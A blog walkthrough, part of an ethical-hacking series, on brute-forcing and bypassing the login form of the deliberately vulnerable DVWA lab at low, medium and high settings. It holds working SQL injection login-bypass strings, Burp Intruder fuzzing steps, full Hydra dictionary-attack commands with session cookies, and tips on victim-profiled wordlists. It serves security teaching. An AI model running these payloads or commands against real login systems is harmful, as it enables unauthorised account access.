---
published: true
category: Ethical
title: Brute Forcing (DVWA)
author: F3dai
image: https://imgur.com/xxzUmYh.png
---

This post is part of the DVWA series. You can find more DVWA walkthrough's in the [Ethical Hacking](/ethicalhacking/) section of this website. According to [OWASP](https://owasp.org/www-community/attacks/Code_Injection), Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. 

Attackers can utilise different types of password cracking techniques which is elaborated more on this article:

[Password Cracking](/ethical/PasswordCracking/)

This article will be focusing on the exploitation of the intentionally vulnerable web application DVWA. You can more information about this on their website:

[Damn Vulnerable Web Application](http://www.dvwa.co.uk/)

*** Nothing contained in this article is intended to teach or encourage the use of security tools or methodologies for illegal or unethical purposes. Always act in a responsible manner. Make sure you have written permission from the proper individuals before you use any of the tools or techniques described here.

## Low security

Change the setting to low security on DVWA:

![low setting](https://imgur.com/xxzUmYh.png)

Go to the Brute Force page on DVWA. If you are not logged in, these are the credentials:

<pre>admin
password</pre>

Do not log into the login page on the brute forcing section. We are presented with a username input and password input.

Let's analyse the code for the low security setting:

<pre> <?php

if( isset( $_GET['Login'] ) ) {

    $user = $_GET['username'];
    
    $pass = $_GET['password'];
    $pass = md5($pass);

    $qry = "SELECT * FROM `users` WHERE user='$user' AND password='$pass';";
    $result = mysql_query( $qry ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
        // Get users details
        $i=0; // Bug fix.
        $avatar = mysql_result( $result, $i, "avatar" );

        // Login Successful
        echo "<p>Welcome to the password protected area " . $user . "</p>";
        echo '<img src="' . $avatar . '" />';
    } else {
        //Login failed
        echo "<pre><br>Username and/or password incorrect.</pre>";
    }

    mysql_close();
}

?> </pre>

The first thing that comes to mind when analysing log in form code is to check if there is any sanitisation. Here is the following SQL command that is executed:

<pre>SELECT * FROM `users` WHERE user='$user' AND password='$pass';"</pre>

There is no apparent filtering so we can try testing out a selection of SQL commands and look at the responses. Visit this paste bin for a list of SQL injection commands to test if there are any vulnerabilties:

[https://pastebin.com/qwqcu3am](https://pastebin.com/qwqcu3am)

We don't want to be manually entering the commands so we can use a tool called Burp Suite to automate this for us. Let's set up our machine to start bruting this potentially SQL vulnerable log in form. 

Let's set up our attack with the following steps. I will be performing this attack on a Kali Linux machine.

**Proxy**

We will be using Burp Suite to intercept the request from us to DVWA. Set up a proxy, I am using Firefox. Go to your browser menu > preferences > Network Settings > (a box should pop up) select manual configuration and enter the localhost address "127.0.0.1" as your HTTP proxy > clear the "No proxy for" box and ok the settings.

![proxy](https://imgur.com/9GLpaVL.png)

**Burp Suite**

Open Burp Suite on your system. This will be used to analyse the web request.

![open burp](https://imgur.com/2ZZ2IXY.png)

There are many tools on Burp Suite, however, we are only interested in the intercepted request. Go to the Proxy tab. The intercept should be on. 

![proxy tab](https://imgur.com/FMz7VO7.png)

**Intercept**

Now we are ready to analyse the request, go back to the log in page on DVWA and enter any random credentials. It does not matter what is entered, as long as you provide incorrect details.

![test creds](https://imgur.com/mzWzbDu.png)

Once you submit the details, the request should pop up in Burp Suite. 

This is my request to http://192.168.56.118:

<pre>GET /dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login HTTP/1.1
Host: 192.168.56.118
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.118/dvwa/vulnerabilities/brute/
Connection: close
Cookie: security=low; PHPSESSID=3f319f0402f5ec006e7b70da8ea92bf4
Upgrade-Insecure-Requests: 1</pre>

If you are unaware, there are different types of web requests such as GET, POST, PUT and more. Please read more about this on this website if you want to research more:

[Mozilla Developer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)

Here we can see all types of information being sent to DVWA such as the GET request, host, browser info, cookie etc. 

Now that we have this request in Burp Suite, we want to send this to the intruder. Right click and sent to intruder.

![send to intruder](https://imgur.com/Ko6AFoD.png)

The intruder is a section in Burp Suite which we will use to perform a simple brute-force that will test all of our SQL commands. 

You may switch off the proxy now as we have our relevant information.

Go to the "Intruder" tab (same level as the proxy tab), then go to "Positions". 

![positions](https://imgur.com/gjk6yD7.png)

This will be the request we captured. We want to clear all of the variables Burp Suite has automatically set for us. Do this by selecting the "clear §" button on the right hand side of the request box. You should now see the original request.

We want to specify our own variables instead. Highlight the username we inputted ("test") in the GET request and create a variable with "add §" like so:

![add var](https://imgur.com/Uwg2YLe.png)

The GET request should look like this:

<pre>GET /dvwa/vulnerabilities/brute/?username=§test§#&password=test&Login=Login HTTP/1.1</pre>

This is telling Burp Suite to replace the §test§ with our own specified words. Let's specify our wordlist.

Copy all of the SQL commands from the [pastebin](https://pastebin.com/qwqcu3am). Go to the payloads tab just next to positions and click "paste" in the Payload Options [simple list] section. It should look like this:

![paste](https://imgur.com/HsmJc5U.png)

Now that Burp has our wordlist and the web request, we can systematically test all the SQL commands. Select "Start Attack" on the same payloads tab and wait for all the responses to go through.

Once all attempts are complete, look through all of the responses. The length column is a good indicator that we have found something interesting.

Click on one of the requests, go to the "Response" tab and analyse the raw text.

![raw](https://imgur.com/uakdQ5A.png)

A close look reveals this is simply the wrong username and password. We can see the failed message:

<pre>Username and/or password incorrect</pre>

This is another request with a length of 549:

![req 2](https://imgur.com/tJpbPYi.png)

This has an SQL error which means we were right to identify the SQL vulnerability but this has incorrect syntax according to the error message. We are therefore looking for something similar to the first request we have looked at - no error and successful login.

This one is interesting as it has a length of 4832, very similar to our first one. A closer look at the response shows no error messages:

![first true](https://imgur.com/aicFIgt.png)

I have put the results in ascending length order to group all responses of 4832 length together:  

![second true](https://imgur.com/kY9XeUs.png)

<pre>or 1=1#
admin' #
admin' or '1'='1'#
admin' or 1=1#
admin' AND password='1=1'#
admin' AND password=password#</pre>

Let's test one out on the DVWA web page.

![success](https://imgur.com/5MZRU0v.png)

We have successfully obtained authorised access without entering a password.

I'll break this down but I won't go too much into detail as this article is aimed at brute-forcing, not SQL injection.

As you may have noticed, all the responses identified above end with the character "#". This is a character used for comments, meaning the rest of the SQL query was ignored. 

This was the original SQL query we found in the source code:

![sql](https://imgur.com/B1QPwVC.png)

And this would be the query submitted with our SQL example:

![sql](https://imgur.com/F9nhSXj.png)

As you can see, the rest of the SQL query has been commented out meaning we could modify the SQL statement to return user='admin' and TRUE (password=password).

## Medium security

Here is the code for the medium security:

<pre> <?php

if( isset( $_GET[ 'Login' ] ) ) {

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = mysql_real_escape_string( $user );

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = mysql_real_escape_string( $pass );
    $pass = md5( $pass );

    $qry = "SELECT * FROM `users` WHERE user='$user' AND password='$pass';";
    $result = mysql_query( $qry ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows($result) == 1 ) {
        // Get users details
        $i=0; // Bug fix.
        $avatar = mysql_result( $result, $i, "avatar" );

        // Login Successful
        echo "<p>Welcome to the password protected area " . $user . "</p>";
        echo '<img src="' . $avatar . '" />';
    } else {
        //Login failed
        echo "<pre><br>Username and/or password incorrect.</pre>";
    }

    mysql_close();
}

?> </pre>

The main difference I see is the SQL sanitising meaning we can't execute arbitrary SQL commands in a brute-force method to reveal the password. The code has some functions called "mysql_real_escape_string"  which seem to sanitise the username and password input. 

Our goal is to gain authorised access to the log in page by utilising the Brute Force technique with a dictionary attack.

A dictionary attack essentially systematically uses words from a list as passwords to gain access to a system.

Set up your machine the same way as we did in Low security:

1 - Set up proxy for 127.0.0.1
2 - Launch Burp Suite
3 - Intercept the traffic with random credentials.

Make note of the web request interception, you will need to copy the following information as these will be needed for constructing the brute forcing attack:

<pre>GET /dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login HTTP/1.1
Cookie: security=low; PHPSESSID=3f319f0402f5ec006e7b70da8ea92bf4</pre>

Once you have noted the GET request and Cookie information, you can close down Burp Suite and turn your proxy off. 

**Hydra**

Now we are ready to construct our Hydra command. [THC-Hydra](https://tools.kali.org/password-attacks/hydra) is a tool which is used for login cracking. Here is the template we will use:

<pre>hydra [host] -l [user] -P [passwordlist] http-get-form “ [username ^USER^ password ^PASS^ ] : F=[Failed Message] : H=Cookie: [Cookie Value]” </pre>

So here is the command that I need to use:

<pre> hydra 192.168.56.118 -l admin -P "/usr/share/wordlists/rockyou.txt" http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=3f319f0402f5ec006e7b70da8ea92bf4"</pre>

This command is first specifying our host IP, -l user, -P wordlist, http-get-form is the type of traffic (this is a GET request). "/login/page : username and password field : F = Our message we noted if login is incorrect : H=Cookie: Our cookie from this session". Run this command on your machine, you can include -V as well to see the verbose output to see what's going on.

I have used a premade wordlist in Kali Linux, but you can use anything you like. This is the output: 

![dictionary](https://imgur.com/YwO5AfI.png) 

The password “password” has been found by looking at the responses of the web requests made by hydra. Hydra keeps testing passwords until it receives anything but the failed login message we specified.

We can confirm this with the DVWA page. 

![success](https://imgur.com/alQco9v.png)

## High Security

Let's start by running our previous hydra command.

If you run the command again, you will notice the attack taking a significantly longer amount of time. Let's see how long the response time is. We can compare the medium and high security level response times.

I'll set up a for loop to make sure the results are reliable.

<pre>for loop in {1..3}; do
time curl -s -b 'security=medium; PHPSESSID=3f319f0402f5ec006e7b70da8ea92bf4' -b dvwa.cookie 'http://192.168.56.118/dvwa/vulnerabilities/brute/?username=123&password=123&Login=Login#' > /dev/null
done</pre>

And this is the result:

![time test1](https://imgur.com/N5DNcWS.png)

The medium security takes less than a millisecond to respond. Now for the high security:

<pre>for loop in {1..3}; do
time curl -s -b 'security=high; PHPSESSID=3f319f0402f5ec006e7b70da8ea92bf4' -b dvwa.cookie 'http://192.168.56.118/dvwa/vulnerabilities/brute/?username=123&password=123&Login=Login#' > /dev/null
done</pre>

![time test2](https://imgur.com/kvrVPeJ.png)

This takes more than 3 seconds for each response. This is significantly longer than before. If you look at the source code, there is a noticable addition of sleep(3) if the login is incorrect. Here is a snippet of the code:

<pre>if( $result && mysql_num_rows( $result ) == 1 ) {
    // Get users details
    $i=0; // Bug fix.
    $avatar = mysql_result( $result, $i, "avatar" );

    // Login Successful
    echo "<p>Welcome to the password protected area " . $user . "</p>";
    echo '<img src="' . $avatar . '" />';
} 
else {
    // Login failed
    sleep(3);
    echo "<pre><br>Username and/or password incorrect.</pre>";
}
</pre>

This means that the above method would still work but it would take a significantly longer amount of time to crack.

In fact, if the response time for medium security is around 0.024 seconds, and high security is around 3.2 seconds, the time to brute force with our traditional method would in theory take 133 times as long. 

One method of approaching this would be to create a smaller, specific wordlist which could save lots of time. 

Let's assume the user is unintelligent and has picked one of the most common passwords. According to [cnn](https://edition.cnn.com/2019/04/22/uk/most-common-passwords-scli-gbr-intl/index.html), the most common passwords are the following:

<pre>123456
123456789
qwerty
password
111111
12345678
abc123
1234567
password1
12345</pre>

Let's put this into a file to use as a wordlist.

![words](https://imgur.com/zPM3eHu.png)

Now use the same hydra command as before but with our new wordlist:

<pre>hydra 192.168.56.118 -l admin -P "common.txt" http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=3f319f0402f5ec006e7b70da8ea92bf4"</pre>

![done](https://imgur.com/HVJjaT3.png)

Creating wordlists according to the person is also an intelligent approach. Attackers often enumerate information about their victim such as family names, pets, DOB, where they live etc. to create a more efficient dictionary. 
